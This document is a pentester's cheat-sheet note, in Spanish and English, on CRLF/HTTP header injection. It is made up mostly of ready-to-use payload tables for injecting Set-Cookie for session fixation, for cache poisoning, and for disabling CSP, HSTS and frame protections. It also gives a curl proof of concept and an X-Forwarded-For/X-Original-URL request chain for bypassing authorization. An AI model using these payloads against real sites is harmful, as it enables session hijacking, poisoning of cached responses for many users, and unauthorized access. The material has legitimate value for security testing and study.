---
aliases:
  - Set-Cookie Injection
  - Cache Poisoning Header
  - CSP Bypass via Header
tags:
  - type/technique
  - vuln/crlf-injection
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[CRLF Injection]]'
---
# CRLF Injection - HTTP Header Injection

***

## Set-Cookie Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Inject session cookie | `?url=ok%0d%0aSet-Cookie:%20session=ATTACKER_SET` | Session fixation. |
| Inject CSRF token | `%0d%0aSet-Cookie:%20csrf_token=KNOWN_VALUE` | Predictable token. |
| Override existing cookie | Same name + Path → wins precedence | Cookie tossing. |
| Persistent cookie | `%0d%0aSet-Cookie:%20track=1;%20Max-Age=31536000` | Long-lived. |
| Domain-scoped cookie | `%0d%0aSet-Cookie:%20a=1;%20Domain=.target.com` | Cross-subdomain. |
| Path-scoped cookie | `%0d%0aSet-Cookie:%20admin=1;%20Path=/admin` | Path-specific. |
| Multiple cookies | `%0d%0aSet-Cookie:%20a=1%0d%0aSet-Cookie:%20b=2` | Bulk inject. |
| Insecure flags | Inject sin HttpOnly / Secure | Weakening. |
| Force SameSite=None | `%0d%0aSet-Cookie:%20a=1;%20SameSite=None` | CSRF combo. |
| Cookie tossing combo | Subdomain CRLF + cookie scope abuse | Multi-vector. |
| Combine con session fixation | Set victim's session pre-auth | Standard. |
| Inject `__Host-` prefix | Tries strongest cookie | Defense bypass. |
^crlfi-header-cookie

### PoC Set-Cookie injection

```bash
# Inject session fixation cookie
PAYLOAD='/ok%0d%0aSet-Cookie:%20PHPSESSID=ATTACKER_SESSION_ID'
curl -sI "https://target.com/redirect?url=$PAYLOAD"

# Response includes:
# Location: /ok
# Set-Cookie: PHPSESSID=ATTACKER_SESSION_ID    ← injected!
# 
# Browser sets the cookie. After victim logs in, atacante's session = victim's account.
```

___

## Cache Poisoning via Header

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Cache stores response with injected header. All subsequent users con same cache key see poisoned headers. | Mass impact. |
| Inject Cache-Control | `%0d%0aCache-Control:%20public,%20max-age=31536000` | Force cache. |
| Inject Vary header | `%0d%0aVary:%20Cookie` | Cache key manipulation. |
| Inject CDN-specific | `%0d%0aCDN-Cache-Control:%20...` | Per-CDN. |
| Force inject Surrogate-Control | `%0d%0aSurrogate-Control:%20max-age=999999` | Edge cache control. |
| Long TTL injection | `%0d%0aExpires:%20Mon,%2031%20Dec%202099%2023:59:59%20GMT` | Persistencia. |
| Combine con response splitting | Inject body too → mass victim impact | Compound. |
| Cache key bypass | Manipulate Vary to invalidate | Edge. |
| Inject ETag | Force re-validation | Edge. |
| Inject Last-Modified | Forge date | Edge. |
| Combine con Web Cache Poisoning | Multi-vector | Standard chain. |
| HTTP/2 considerations | H2-specific cache behavior | Modern. |
^crlfi-header-cache

___

## CSP Bypass via Injected Header

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Override CSP | `%0d%0aContent-Security-Policy:%20default-src%20*` | Disable CSP. |
| Inject permissive policy | `%0d%0aCSP:%20script-src%20'unsafe-inline'%20*` | Allow inline scripts. |
| `Content-Security-Policy-Report-Only` | Inject reporting-only (less impact pero detection-bypass) | Edge. |
| Combine con XSS | If body inject + CSP relaxed → XSS executes | Compound. |
| Disable HSTS | `%0d%0aStrict-Transport-Security:%20max-age=0` | HTTPS downgrade. |
| Disable XFO | `%0d%0aX-Frame-Options:%20ALLOWALL` | Clickjacking enable. |
| Override CORP | `%0d%0aCross-Origin-Resource-Policy:%20cross-origin` | CORP. |
| Override COEP/COOP | Window grouping bypass | Edge. |
| Inject custom headers para frontend assumptions | Backend protection bypass | Compound. |
| Browser security feature override | Combine multiple headers | Defense in depth bypass. |
^crlfi-header-csp

___

## Custom Header Injection (X-*)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Inject `X-Forwarded-For` | `%0d%0aX-Forwarded-For:%20127.0.0.1` | If backend reads → IP spoof. |
| Inject `X-Forwarded-Host` | `%0d%0aX-Forwarded-Host:%20attacker.com` | HHI. |
| Inject `X-Original-URL` | Path override (IIS) | Routing bypass. |
| Inject `X-Rewrite-URL` | Same | Same. |
| Inject `X-User` / `X-Authenticated-User` | If trusted | Auth bypass. |
| Inject `X-Tenant-ID` | Multi-tenant escape | Lateral. |
| Inject `X-Forwarded-Proto` | Force scheme | URL building. |
| Inject custom auth header | `Authorization: Bearer ...` | If reflected. |
| Inject backend routing | `X-Forwarded-Server: ...` | Internal trust. |
| Combine con reverse proxy chain | Inject between front/back | HRS-adjacent. |
| Inject Frame-Options | Bypass clickjacking protection | Defense bypass. |
| Inject Trace headers | Distributed tracing manipulation | Edge. |
| Multi-header inject | Stack multiple X-* | Bulk. |
^crlfi-header-custom

### PoC custom header chain

```
Atacante request:
GET /redirect?url=ok%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aX-Original-URL:%20/admin HTTP/1.1
Host: target.com

Server response (reflected):
HTTP/1.1 302 Found
Location: ok
X-Forwarded-For: 127.0.0.1     ← injected
X-Original-URL: /admin          ← injected
...

If backend has middleware that reads X-Forwarded-For for IP allowlist
or X-Original-URL for path override → atacante bypasses authorization.
```

***
